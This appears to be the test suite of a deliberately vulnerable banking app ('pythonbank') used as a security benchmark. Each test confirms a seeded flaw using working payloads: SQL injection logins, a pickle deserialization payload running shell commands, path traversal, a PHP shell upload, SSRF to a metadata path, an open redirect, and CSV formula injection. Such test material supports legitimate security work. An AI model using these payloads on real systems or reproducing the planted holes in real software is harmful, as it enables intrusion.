"""The target's own suite: every seeded weakness asserted present via the app.

These tests are the ``tests_that_must_stay_green`` list in manifest.yaml — a
fix that closes a PoC must keep them passing, because each one exercises the
public surface a legitimate client uses.
"""

from __future__ import annotations

import base64
import hashlib
import io
import pickle
import sqlite3
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

BANK_ROOT = Path(__file__).resolve().parents[1]


def _login(client, username: str, password: str):
    return client.post("/api/auth/login", json={"username": username, "password": password})


def _alice_token(client) -> str:
    response = _login(client, "alice", "Alice!Passw0rd1")
    assert response.status_code == 200
    return response.get_json()["token"]


class _MarkerHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 (http.server API)
        if self.path.startswith("/latest/meta-data"):
            body = b"ami-id=ami-pythonbanktest\n"
        else:
            body = b"ssrf-test-marker-ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args) -> None:  # noqa: A002
        """Silence the probe."""


@pytest.fixture()
def probe_url():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _MarkerHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


def test_health(client):
    response = client.get("/health")
    assert response.status_code == 200
    assert response.get_json()["bank"] == "pythonbank"


def test_seeded_login_and_me(client):
    token = _alice_token(client)
    me = client.get("/api/users/me", headers={"Authorization": f"Bearer {token}"})
    assert me.status_code == 200
    assert me.get_json()["username"] == "alice"


def test_login_sql_injection_authenticates_as_admin(client):
    """VULN-001."""
    response = client.post(
        "/api/auth/login",
        json={
            "username": "x' UNION SELECT 1,'admin','admin','admin@pythonbank.test' -- ",
            "password": "x",
        },
    )
    assert response.status_code == 200
    assert response.get_json()["user"]["role"] == "admin"


def test_login_has_no_rate_limit(client):
    """VULN-002."""
    statuses = [_login(client, "alice", "wrongpassword").status_code for _ in range(12)]
    assert statuses == [401] * 12


def test_login_failures_are_distinguishable(client):
    """VULN-003."""
    wrong = _login(client, "alice", "wrongpassword")
    missing = _login(client, "definitely_not_a_user_xyz", "wrongpassword")
    assert wrong.status_code == 401
    assert wrong.get_json()["error"] == "wrong password"
    assert missing.status_code == 404
    assert missing.get_json()["error"] == "no such user"


def test_register_stores_md5(client, db_file):
    """VULN-004."""
    created = client.post(
        "/api/auth/register",
        json={
            "username": "md5user",
            "password": "Known!Password1",
            "email": "md5user@pythonbank.test",
        },
    )
    assert created.status_code == 201
    conn = sqlite3.connect(db_file)
    try:
        row = conn.execute(
            "SELECT password_hash FROM users WHERE username = 'md5user'"
        ).fetchone()
    finally:
        conn.close()
    assert row is not None
    assert row[0] == hashlib.md5(b"Known!Password1").hexdigest()


def test_signing_secret_is_a_literal_and_served(client):
    """VULN-005 and VULN-006."""
    source = (BANK_ROOT / "src" / "pythonbank" / "tokens.py").read_text(encoding="utf-8")
    assert "pythonbank-dev-secret-do-not-ship" in source
    response = client.get("/api/config")
    assert response.status_code == 200
    assert response.get_json()["token_secret"] == "pythonbank-dev-secret-do-not-ship"


def test_command_endpoint_runs_shell(client):
    """VULN-007."""
    admin = _login(client, "admin", "Adm1n!Passw0rd")
    token = admin.get_json()["token"]
    response = client.post(
        "/api/admin/exec",
        json={"cmd": "echo pythonbank-test-marker"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert response.status_code == 200
    assert "pythonbank-test-marker" in response.get_json()["stdout"]


def test_import_unpickles_the_payload(client):
    """VULN-008."""

    class _Marker:
        def __reduce__(self):
            return (subprocess.getoutput, ("echo pythonbank-test-marker",))

    payload = base64.b64encode(pickle.dumps(_Marker())).decode("ascii")
    response = client.post("/api/import", json={"payload": payload})
    assert response.status_code == 200
    assert "pythonbank-test-marker" in response.get_json()["result"]


def test_download_traverses_out_of_public(client):
    """VULN-009."""
    response = client.get("/api/files/", query_string={"name": "../private/flag.txt"})
    assert response.status_code == 200
    assert b"pythonbank-flag" in response.data


def test_upload_accepts_dangerous_extension(client):
    """VULN-010."""
    data = {"file": (io.BytesIO(b"<?php echo 'pythonbank-upload-marker'; ?>"), "shell.phtml")}
    response = client.post("/api/files/upload", data=data, content_type="multipart/form-data")
    assert response.status_code == 201
    assert response.get_json()["stored"] == "shell.phtml"


def test_fetch_proxy_reaches_a_local_service(client, probe_url):
    """VULN-011."""
    response = client.post("/api/fetch", json={"url": f"{probe_url}/ssrf-marker"})
    assert response.status_code == 200
    assert "ssrf-test-marker-ok" in response.get_json()["body"]


def test_fetch_proxy_reaches_the_metadata_path(client, probe_url):
    """VULN-012."""
    response = client.post("/api/fetch", json={"url": f"{probe_url}/latest/meta-data/"})
    assert response.status_code == 200
    assert "ami-id=ami-pythonbanktest" in response.get_json()["body"]


def test_redirect_leaves_the_site(client):
    """VULN-013."""
    response = client.get(
        "/api/redirect",
        query_string={"next": "http://evil.example/landing"},
        follow_redirects=False,
    )
    assert response.status_code == 302
    assert response.headers["Location"] == "http://evil.example/landing"


def test_export_keeps_formula_characters(client):
    """VULN-014."""
    token = _alice_token(client)
    headers = {"Authorization": f"Bearer {token}"}
    created = client.post(
        "/api/transactions",
        json={"to": 2, "amount": 1, "note": "=cmd|' /C calc'!A0"},
        headers=headers,
    )
    assert created.status_code == 201
    export = client.get("/api/export/transactions.csv", headers=headers)
    assert export.status_code == 200
    assert "=cmd" in export.get_data(as_text=True)


def test_debug_returns_traceback(client):
    """VULN-015."""
    response = client.get("/api/debug")
    assert response.status_code == 500
    assert "Traceback (most recent call last)" in response.get_data(as_text=True)


def test_any_user_can_read_any_account(client):
    """VULN-016."""
    token = _alice_token(client)
    response = client.get("/api/users/2", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 200
    body = response.get_json()
    assert body["username"] == "bob"
    assert body["email"] == "bob@pythonbank.test"


def test_report_summary_sql_injection_across_modules(client):
    """VULN-017: the SQL is assembled in core.reports, not in the route."""
    token = _alice_token(client)
    response = client.get(
        "/api/reports/summary",
        query_string={"department": "x' GROUP BY department UNION SELECT 'interproc-marker', 1, 1 -- "},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert response.status_code == 200
    rows = response.get_json()["rows"]
    assert [row["department"] for row in rows] == ["interproc-marker"]
